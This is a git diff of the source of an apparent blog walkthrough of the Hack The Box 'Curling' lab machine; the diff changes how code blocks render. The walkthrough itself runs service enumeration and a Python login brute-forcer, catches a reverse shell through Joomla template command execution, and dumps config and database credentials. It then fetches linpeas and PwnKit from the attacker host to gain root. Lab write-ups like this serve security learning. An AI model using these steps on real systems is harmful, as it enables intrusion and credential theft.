@@ -26,8 +26,7 @@ Here we go taking a draw shot at the house to get the flag in this Curling box. 
 
 Let's run nmap to try to get the running services.
 
-{% raw %}
-```bash
+{% capture nmap %}
 ┌──(kali㉿kali)-[~/Documents/htb/curling]
 └─$ sudo nmap -sC -sV -A -O -oN nmap 10.10.10.150            
 [sudo] password for kali: 
@@ -59,8 +58,8 @@ HOP RTT      ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 9.87 seconds
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=nmap %}
 
 <br />
 Check the landing page the webserver is serving.
@@ -74,18 +73,16 @@ Check the landing page the webserver is serving.
 <br />
 Since the landing page said cewl, let's run cewl.  Seems reasonable.
 
-{% raw %}
-```bash
+{% capture cewl %}
 ┌──(kali㉿kali)-[~/Documents/htb/curling]
 └─$ cewl http://10.10.10.150 -d 3 --with-numbers > cewllist.txt
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=cewl %}
 
 <br />
 Give ffuf a run to fuzz faster looking for file and folders for port 80.
 
-{% raw %}
-```bash
+{% capture ffuf %}
 ┌──(kali㉿kali)-[~/Documents/htb/curling]
 └─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.10.150/FUZZ -e .txt,.bak,.php -fw 762
 
@@ -135,17 +132,16 @@ cli                     [Status: 301, Size: 310, Words: 20, Lines: 10, Duration:
 .php                    [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 193ms]
 server-status           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 264ms]
 :: Progress: [882236/882236] :: Job [1/1] :: 161 req/sec :: Duration: [1:25:20] :: Errors: 0 ::
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=ffuf %}
 
 <br />
 Check the secrets.txt file on the webserver.
 
-{% raw %}
-```bash
+{% capture secrettxt %}
 Q3VybGluZzIwMTgh
-```
-{% endraw %}
+{% endcapture %}
+{% include codebox.html title="secret.txt" content=secrettxt %}
 
 <br />
 Check the Administrator page looking for the login page.
@@ -159,8 +155,7 @@ Check the Administrator page looking for the login page.
 <br />
 Run the joomscan to identify the version of Joomla! that we are working with.
 
-{% raw %}
-```bash
+{% capture joomlascan %}
     ____  _____  _____  __  __  ___   ___    __    _  _ 
    (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
   .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  ( 
@@ -214,9 +209,9 @@ http://10.10.10.150/images/banners
 [++] Readable config files are not found
                                                                                                                                                                                                                                             
                                                                                                                                                                                                                                             
-Your Report : reports/10.10.10.150/ 
-```
-{% endraw %}
+Your Report : reports/10.10.10.150/
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=joomlascan %}
 
 <br />
 Give admin:admin a whirl in ye old login page.
@@ -275,9 +270,8 @@ Are spaces allowed in a username?
 <br />
 Write a login brute-forcer that user rockyou and admin to try and crack the password.  I let it run for longer than I probably should have before giving up.
 
-{% raw %}
-```python
- import requests
+{% capture htbcurling00 %}
+import requests
 
 
 def get_csrf(rt):
@@ -307,14 +301,13 @@ with open('/usr/share/wordlists/rockyou.txt','r') as fs:
             break
     else:
         print('[-] No credentials found')
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='python' title='htb-curling_0x00.py' content=htbcurling00 %}
 
 <br />
 Create a mutator to mutate our cewl list with the year at the end to spice it up a little.  Since 2018 and 2025 appear in the cewl list, use all years between 2018 and 2025. 
 
-{% raw %}
-```python
+{% capture mutator00 %}
 yr = ['2017','2018','2019','2020','2021','2022','2023','2024','2025']
 
 with open('/home/kali/Documents/htb/curling/cewllist.txt','r') as fi:
@@ -325,14 +318,13 @@ with open('/home/kali/Documents/htb/curling/cewllist.txt','r') as fi:
             for year in yr:
                 updpass = passwd + year
                 fo.write(updpass + '\n')
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='python' title='mutator_0x00.py' content=mutator00 %}
 
 <br />
 Update the brute-forcer to use the new mutated list.
 
-{% raw %}
-```python
+{% capture htbcurling01 %}
 import requests
 
 
@@ -363,34 +355,38 @@ with open('/home/kali/Documents/htb/curling/cewlmut.txt','r') as fs:
             break
     else:
         print('[-] No credentials found')
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='python' title='htb-curling_0x01.py' content=htbcurling01 %}
 
 <br />
 Create a list of potential user.  I used this list hydra to try and brute-force hydra.
 
-{% raw %}
-```bash
+{% capture catuserstxt %}
 ┌──(kali㉿kali)-[~/Documents/htb/curling]
-└─$ cat users.txt                                          
+└─$ cat users.txt
+{% endcapture %}
+
+{% capture userstxt %}
 Floris
 admin
 floris
 curling
 root
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=catuserstxt %}
+
+{% include codebox.html title="users.txt" content=userstxt %}
 
 <br />
-It was this point that I decided to ask ChatGPT for more information of that secret.txt string.  I didn't to just Google it because a write-up for this box would come up.  So, I thought this was the best option.  Turns out, it is a base64 string.  Decode the string.
+It was this point that I decided to ask ChatGPT for more information of that secret.txt string.  I didn't want to just Google it because a write-up for this box would come up.  So, I thought this was the best option.  Turns out, it is a base64 string.  Decode the string.
 
-{% raw %}
-```bash
+{% capture decodesecret %}
 ┌──(kali㉿kali)-[~/Documents/htb/curling]
 └─$ echo 'Q3VybGluZzIwMTgh' | base64 -d   
 Curling2018!
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=decodesecret %}
 
 <br>
 Try using floris and the decoded password to try and login.
@@ -404,15 +400,14 @@ Try using floris and the decoded password to try and login.
 <br />
 Test for password ru-use with ssh.
 
-{% raw %}
-```bash
+{% capture sshfloris %}
 ┌──(kali㉿kali)-[~/Documents/htb/curling]
 └─$ ssh floris@10.10.10.150                   
 floris@10.10.10.150's password: 
 Permission denied, please try again.
 floris@10.10.10.150's password:
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=sshfloris %}
 
 <br />
 Check the available templates available.
@@ -462,14 +457,13 @@ Test the command execution.
 <br />
 Start a netcat listener.
 
-{% raw %}
-```bash
+{% capture start443listener %}
 ┌──(kali㉿kali)-[~/Documents/htb/curling]
 └─$ sudo nc -nlvp 443                         
 [sudo] password for kali: 
 listening on [any] 443 ...
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=start443listener %}
 
 <br />
 Use revshells to generate a payload.
@@ -493,35 +487,35 @@ Use the payload from revshells in the c parameter.
 <br />
 Check the listener and catch the shell.
 
-{% raw %}
-```bash
+{% capture catchshell %}
 ┌──(kali㉿kali)-[~/Documents/htb/curling]
 └─$ sudo nc -nlvp 443                         
 [sudo] password for kali: 
 listening on [any] 443 ...
 connect to [10.10.16.11] from (UNKNOWN) [10.10.10.150] 43804
 www-data@curling:/var/www/html/templates/beez3$
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=catchshell %}
 
 <br />
 Run id to get a sense of who we are.
 
-{% raw %}
-```bash
+{% capture runid %}
 www-data@curling:/var/www/html/templates/beez3$ id
 id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=runid %}
 
 <br />
 Check the /etc/passwd file.
 
-{% raw %}
-```bash
+{% capture catetcpasswd %}
 www-data@curling:/var/www/html/templates/beez3$ cat /etc/passwd
 cat /etc/passwd
+{% endcapture %}
+
+{% capture etcpasswd %}
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
@@ -553,14 +547,16 @@ pollinate:x:109:1::/var/cache/pollinate:/bin/false
 sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
 floris:x:1000:1004:floris:/home/floris:/bin/bash
 mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=catetcpasswd %}
+
+{% include codebox.html title="Config File Example" content=etcpasswd %}
 
 <br />
 Check the configuration.php file for the database password.
 
-{% raw %}
-```php
+{% capture configurationphp %}
 <?php
 class JConfig {
         public $offline = '0';
@@ -586,28 +582,25 @@ class JConfig {
         public $error_reporting = 'default';
 
 <snip>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='php' title='configuration.php' content=configurationphp %}
 
 <br />
 Test the database password for password re-use with floris.
 
-{% raw %}
-```bash
-<?php
+{% capture sufloris %}
 www-data@curling:/var/www/html$ su floris 
 su floris
 Password: mYsQ!P4ssw0rd$yea!
 
 su: Authentication failure
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=sufloris %}
 
 <br />
 Emumerate the mysql database.
 
-{% raw %}
-```bash
+{% capture enumdb %}
 www-data@curling:/var/www/html$ mysql -u floris -p
 mysql -u floris -p
 Enter password: mYsQ!P4ssw0rd$yea!
@@ -648,14 +641,13 @@ select username, password from eslfu_users;
 mysql> exit
 exit
 Bye
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=enumdb %}
 
 <br />
 Run ss -antlp to get of the actively listening listeners.
 
-{% raw %}
-```bash
+{% capture ssantlp %}
 www-data@curling:/opt$ ss -antlp
 ss -antlp
 State    Recv-Q    Send-Q        Local Address:Port        Peer Address:Port    
@@ -664,38 +656,38 @@ LISTEN   0         128           127.0.0.53%lo:53               0.0.0.0:*
 LISTEN   0         128                 0.0.0.0:22               0.0.0.0:*       
 LISTEN   0         128                       *:80                     *:*       
 LISTEN   0         128                    [::]:22                  [::]:*
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=ssantlp %}
 
 <br />
 Run the uname -a to get the Linux version.
 
-{% raw %}
-```bash
+{% capture unamea %}
 www-data@curling:/opt$ uname -a
 uname -a
 Linux curling 4.15.0-156-generic #163-Ubuntu SMP Thu Aug 19 23:31:58 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=unamea %}
 
 <br />
 Run /etc/issue to get the OS version.
 
-{% raw %}
-```bash
+{% capture catissue %}
 www-data@curling:/opt$ cat /etc/issue
 cat /etc/issue
 Ubuntu 18.04.5 LTS \n \l
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=catissue %}
 
 <br />
 Enumerate further and notice the password_backup file in floris.
 
-{% raw %}
-```bash
+{% capture catpasswordbackup %}
 www-data@curling:/home/floris$ cat password_backup
 cat password_backup
+{% endcapture %}
+
+{% capture passwordbackup %}
 00000000: 425a 6839 3141 5926 5359 819b bb48 0000  BZh91AY&SY...H..
 00000010: 17ff fffc 41cf 05f9 5029 6176 61cc 3a34  ....A...P)ava.:4
 00000020: 4edc cccc 6e11 5400 23ab 4025 f802 1960  N...n.T.#.@%...`
@@ -712,14 +704,16 @@ cat password_backup
 000000d0: 8259 be50 0986 1e48 42d5 13ea 1c2a 098c  .Y.P...HB....*..
 000000e0: 8a47 ab1d 20a7 5540 72ff 1772 4538 5090  .G.. .U@r..rE8P.
 000000f0: 819b bb48                                ...H
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=catpasswordbackup %}
+
+{% include codebox.html title="password_backup" content=passwordbackup %}
 
 <br />
 Download the linpeas.sh.
 
-{% raw %}
-```bash
+{% capture downloadpeas %}
 ┌──(kali㉿kali)-[~/Documents/htb/curling]
 └─$ wget https://github.com/peass-ng/PEASS-ng/releases/download/20250601-88c7a0f6/linpeas.sh
 --2025-06-12 00:52:23--  https://github.com/peass-ng/PEASS-ng/releases/download/20250601-88c7a0f6/linpeas.sh
@@ -742,14 +736,13 @@ linpeas.sh                                                 100%[================
 ┌──(kali㉿kali)-[~/Documents/htb/curling]
 └─$ python3 -m http.server          
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=downloadpeas %}
 
 <br />
 Transfer linpeas to the victim machine.  Run linpeas.sh.  I didn't copy the output.  Check the linux exploit suggester section.
 
-{% raw %}
-```bash
+{% capture runpeas %}
 www-data@curling:/tmp$ wget 10.10.16.11:8000/linpeas.sh
 wget 10.10.16.11:8000/linpeas.sh
 --2025-06-11 14:52:52--  http://10.10.16.11:8000/linpeas.sh
@@ -764,14 +757,13 @@ linpeas.sh          100%[===================>] 932.07K   375KB/s    in 2.5s
 
 www-data@curling:/tmp$ chmod +x linpeas.sh
 chmod +x linpeas.sh
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=runpeas %}
 
 <br />
 Run linpeas.sh.
 
-{% raw %}
-```bash
+{% capture runpeas %}
 www-data@curling:/tmp$ ./linpeas.sh
 ./linpeas.sh
 
@@ -819,8 +811,8 @@ www-data@curling:/tmp$ ./linpeas.sh
    Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main
 
 <snip>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=runpeas %}
 
 <br />
 Look-up the PwnKit in the GitHub.
@@ -835,18 +827,23 @@ Look-up the PwnKit in the GitHub.
 <br />
 Download the PwnKit to the local Attack machine.
 
-{% raw %}
-```bash
+<ul>
+    <li>-f == Curl fails silently on server errors.</li>
+    <li>-s == Suppress the progress meter and errors.</li>
+    <li>-S == Shows errors to override s.</li>
+    <li>-L == Follows any redirects.</li>
+<ul>
+
+{% capture downloadpwnkit %}
 ┌──(kali㉿kali)-[~/Documents/htb/curling]
 └─$ curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=downloadpwnkit %}
 
 <br />
 Transfer PwnKit to the victim machine.
 
-{% raw %}
-```bash
+{% capture transferpwnkit %}
 www-data@curling:/tmp$ wget 10.10.16.11:8000/PwnKit
 wget 10.10.16.11:8000/PwnKit
 --2025-06-11 15:03:44--  http://10.10.16.11:8000/PwnKit
@@ -861,27 +858,25 @@ PwnKit              100%[===================>]  17.62K  30.6KB/s    in 0.6s
 
 www-data@curling:/tmp$ chmod +x PwnKit
 chmod +x PwnKit
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=transferpwnkit %}
 
 <br />
 Run PwnKit and run id to confirm success.
 
-{% raw %}
-```bash
+{% capture runpwnkit %}
 www-data@curling:/tmp$ ./PwnKit
 ./PwnKit
 root@curling:/tmp# id
 id
 uid=0(root) gid=0(root) groups=0(root),33(www-data)
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=runpwnkit %}
 
 <br />
 Get the user.txt flag.
 
-{% raw %}
-```bash
+{% capture userflag %}
 root@curling:/home/floris# cat user.txt
 cat user.txt
 <redacted>
@@ -901,14 +896,13 @@ ip a
        valid_lft 86398sec preferred_lft 14398sec
     inet6 fe80::250:56ff:fe95:aa67/64 scope link 
        valid_lft forever preferred_lft forever
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=userflag %}
 
 <br />
 Get the root.txt flag.
 
-{% raw %}
-```bash
+{% capture rootflag %}
 root@curling:/home/floris# cat /root/root.txt
 cat /root/root.txt
 <redacted>
@@ -928,8 +922,8 @@ ip a
        valid_lft 86397sec preferred_lft 14397sec
     inet6 fe80::250:56ff:fe95:aa67/64 scope link 
        valid_lft forever preferred_lft forever
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=rootflag %}
 
 <br />
 SWEEP!  And with that we swept up the flags on Curling!  Hopefully, you enjoyed the read.  See you in the next one.
